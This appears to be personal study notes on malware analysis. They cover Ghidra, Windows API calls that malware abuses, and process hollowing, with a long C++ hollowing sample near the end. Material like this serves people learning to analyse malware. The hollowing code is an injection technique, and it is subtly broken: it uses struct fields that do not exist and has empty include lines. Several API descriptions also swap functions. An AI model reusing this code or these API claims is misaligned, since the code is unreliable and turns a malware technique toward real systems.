#malwareanalysis 

## Ghidra

Many disassemblers can be like cutter, radare2, Ghidra and IDA Pro can be used to disassemble malware.

Ghidra is a software reverse engineering tool that allows users to analyze compiled code to understand its functionality.

### Features

- **Decompilation**: It can decompile binaries into readable C code, making it easier for developer to understand how the software works.
- **Disassebmly**: It can disassemble binaries into assembly language, allowing analysts to examine low-level operations of the code.
- **Debugging**: Ghidra has a built-in debugger that allows users to step through code and examine its behavior.
- **Analysis**: It can automatically identify functions, variables and other code to help understand the structure of the code.

### Analyzing the Assembly code

- Locate the main function from the Symbol Tree section
- Check the .txt code from the Program Trees section to see the code section and find the entry point.
- Search for interesting strings and locate the code from where those strings are referenced.

**Note:** Different compilers add their own code for various checks while compiling. Therefore expect some garbage assembly code that does not make sense.


### Windows API

Collection of functions and services the Windows Operating System provides to enable developers to create Windows Applications.

#### Create Process API

The `CreateProcessA` function creates a new process and its primary thread. The function takes several parameters, including the name of the executable file, command-line arguments, and security attributes.

![[Pasted image 20260117182121.png]]

Example of C code that uses `CreateProcessA` to launch a new process:

```c
#include 

int main()
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcess(NULL, "C:\\\\Windows\\\\notepad.exe", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
    {
        printf("CreateProcess failed (%d).\\n", GetLastError());
        return 1;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}
```

The `CreateProcessA` after compilation into assembly code:

```c
push 0
lea eax, [esp+10h+StartupInfo]
push eax
lea eax, [esp+14h+ProcessInformation]
push eax
push 0
push 0
push 0
push 0
push 0
push 0
push dword ptr [hWnd]
call CreateProcessA
```

This assembly code pushes the necessary parameters onto the stack in reverse order and then calls the `CreateProcessA` function. The `CreateProcessA` function then launches a new process and returns a handle to the process and its primary thread.


### Common APIs used by Malware

#### Keylogger

- **SetWindowsHookEx**: It installs an application defined hook procedure into a hook chain. Malware can use this to monitor and intercept system events, such as keystrokes and mouseclicks.
- **GetAyncKeyState**: The function retrieves the status of a virtual key when the function is called. Malware can use this function to determine whether a key is being pressed or released.
- **GetKeyboardState**: Retrieves the status of all virtual keys. Malware can use this to determine the status of all keys on the keyboard.
- **GetKeyNameText**: Retrieves the name of a key. Malware can use this function to determine the name of the pressed key.

#### Downloader

- **URLDownloadToFile**: Downloads a file from the internet and saves it to a local file. Malware can use this function to download additional malicious codes or updates to the malware.
- **WinHttpOpen**: Initializes WinHTTP API. Malware can use this function to establish an HTTP connection to a remote server and download additional malicious code.
- **WinHttpConnect**: Establishes a connection to a remote server using the WinHTTP API. Malware can use this function to connect to a remote server and download additional malicious code.
- **WinHttpOpenRequest**: This function opens HTTP connect request using the WinHTTP API. Malware can use this function to send HTTP requests to a remote server and download additional malicious code or steal data.

#### C2 Communication

- **InternetOpen**: This function reads data from a handle to an open internet resource. Malware can use this function to steal data from a compromised system and transmit it to a C2 server.
- **InternetOpenUrl**: Opens a URL for download. Malware can use this function to download additional malicious code or steal data from a C2 server.
- **HttpOpenRequest**: Opens a HTTP request. Malware can use this function to send HTTP requests to C2 server and receive commands or additional malicious code.
- **HttpSendRequest**: Sends HTTP request. Malware can use this function to send or received commands from C2 server.

#### Data Exfiltration

- **InternetReadFile**: Reads data from a handle to an open internet resource. Malware can use this function to steal data from a compromised system and transmit it to a C2 server.
- **FtpPutFile**: Uploads a file to a FTP server. Malware can use this function to exfiltrate stolen data to a remote server.
- **CreateFile**: Creates or opens a file or device. Malware can use this function to read or modify files containing sensitive information or system configuration data.
- **Writefile**: Writes data to a file or device. Malware can use this function to write stolen data to a file and then exfiltrate it to a remote server.
- **GetClipboardData**: Used to retrieve data from the clipboard. Malware can use this API to retrieve sensitive data that is copied to the clipboard.

#### Dropper

- **CreateProcess**: Used to create a new process in its primary thread. Malware can use this function to execute code in the context of a legitimate process, making it more difficult to detect and analyze.
- **VirtualAlloc**: Reserves or commits a region of memory within the virtual address space of the calling process. Malware can use this function to allocate memory to store its code.
- **WriteProcessMemory**: Writes data to an area of memory within the address space of a specified process. Malware can use this function to write its code to the allocated memory.

#### API Hooking

Method malware use to intercept calls to Windows APIs and modify its behaviour. This allows the malware to avoid detection by security software and perform malicious actions such as stealing data or modifying system settings. Malware can use various APIs for hooking,

- **GetProcAddress**: Retrieves the address of an exported function or variable from a specified DLL. Malware can use this function to locate and hook API calls made by other processes.
- **LoadLibrary**: Loads a DLL into a process's address space. Malware can use this function to load and execute additional code from a DLL or other module.
- **SetWindowsHookEx**: Used to install a hook procedure that monitors messages sent to a window or system event. Malware can use this API to intercept calls to other Windows APIs and modify their behaviour.

#### Anti debugging and VM detection

- **IsDebuggerPresent**: Checks whether a process is running under a debugger. Malware can use this function to determine whether it is being analyzed and take appropriate action to evade detection.
- **CheckRemoteDebuggerPresent**: Checks whether a remote debugger is debugging process. Malware can use this function to determine whether it is being analyzed and take appropriate action to evade detection.
- **NtQueryInformationProcess**: Retrieves information about a specified process. Malware can use this function to determine whether it is being analyzed and take appropriate action to evade detection.
- **GetTickCount**: Retrieves the number of milliseconds elapsed since the system has started. Malware can use this function to determine whether it is running in a virtualized environment, which may indicate that it is being analyzed.
- **GetModuleHandle**: Retrieves a handle to a specified module. Malware can use this function to determine whether it is running in a virtualized environment, which may indicate that it is being analyzed.
- **GetSystemMetrics**: Retrieves various system metrics and configuration settings. 


### Process Hollowing

It is a technique malware use to inject malicious code into a legitimate process running on a victim's computer. The malware creates a suspended process and replaces it memory space with its own code. 

The malware then resumes the process, causing it to execute the injected code. This technique allows the malware to bypass security measures that maybe in place.

#### Steps

- Create a new process using the `CreateProcessA()` API. This process will act as a legitimate process and will be hollowed out.
- `NtSuspendProcess()` is then used to suspend the new process.
- Allocate the memory in the suspended process using the `VirtualAlloEx()` API. The memory will be used to hold the malicious code.
- Write the malicious code to the allocated memory using the `WriteProcessMemory()` API.
- Modify the entry point of the process to point to the address of the malicious code using the `SetThreadContext()` and `GetThreadContext()` APIs.
- Resume the suspended process using the `NtResumeProcess()` API. This will cause the process to execute the malicious code.
- Clean up the process and any resource used during the process.

```c
#include 
#include 
#include 
using namespace std;

bool HollowProcess(char *szSourceProcessName, char *szTargetProcessName)
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe))
    {
        do
        {
            if (_stricmp((const char*)pe.szExeFile, szTargetProcessName) == 0)
            {
                HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
                if (hProcess == NULL)
                {
                    return false;
                }

                IMAGE_DOS_HEADER idh;
                IMAGE_NT_HEADERS inth;
                IMAGE_SECTION_HEADER ish;

                DWORD dwRead = 0;

                ReadProcessMemory(hProcess, (LPVOID)pe.modBaseAddr, &idh, sizeof(idh), &dwRead);
                ReadProcessMemory(hProcess, (LPVOID)(pe.modBaseAddr + idh.e_lfanew), &inth, sizeof(inth), &dwRead);

                LPVOID lpBaseAddress = VirtualAllocEx(hProcess, NULL, inth.OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

                if (lpBaseAddress == NULL)
                {
                    return false;
                }

                if (!WriteProcessMemory(hProcess, lpBaseAddress, (LPVOID)pe.modBaseAddr, inth.OptionalHeader.SizeOfHeaders, &dwRead))
                {
                    return false;
                }

                for (int i = 0; i < inth.FileHeader.NumberOfSections; i++)
                {
                    ReadProcessMemory(hProcess, (LPVOID)(pe.modBaseAddr + idh.e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER))), &ish, sizeof(ish), &dwRead);
                    WriteProcessMemory(hProcess, (LPVOID)((DWORD)lpBaseAddress + ish.VirtualAddress), (LPVOID)((DWORD)pe.modBaseAddr + ish.PointerToRawData), ish.SizeOfRawData, &dwRead);
                }

                DWORD dwEntrypoint = (DWORD)pe.modBaseAddr + inth.OptionalHeader.AddressOfEntryPoint;
                DWORD dwOffset = (DWORD)lpBaseAddress - inth.OptionalHeader.ImageBase + dwEntrypoint;

                if (!WriteProcessMemory(hProcess, (LPVOID)(lpBaseAddress + dwEntrypoint - (DWORD)pe.modBaseAddr), &dwOffset, sizeof(DWORD), &dwRead))
                {
                    return false;
                }

                CloseHandle(hProcess);

                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcess(NULL, szSourceProcessName, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
    {
        return false;
    }

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(pi.hThread, &ctx))
    {
        return false;
    }

    ctx.Eax = (DWORD)pi.lpBaseOfImage + ((IMAGE_DOS_HEADER*)pi.lpBaseOfImage)->e_lfanew + ((IMAGE_NT_HEADERS*)(((BYTE*)pi.lpBaseOfImage) + ((IMAGE_DOS_HEADER*)pi.lpBaseOfImage)->e_lfanew))->OptionalHeader.AddressOfEntryPoint;

    if (!SetThreadContext(pi.hThread, &ctx))
    {
        return false;
    }

    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return true;
}

int main()
{
    char* szSourceProcessName = "C:\\\\Windows\\\\System32\\\\calc.exe";
    char* szTargetProcessName = "notepad.exe";

    if (HollowProcess(szSourceProcessName, szTargetProcessName))
    {
        cout << "Process hollowing successful" << endl;
    }
    else
    {
        cout << "Process hollowing failed" << endl;
    }

    return 0;
}
```


An important point to note is that almost all malware comes packed with known or custom packers and also have employed different Anti-debugging / VM detection techniques to hinder the analysis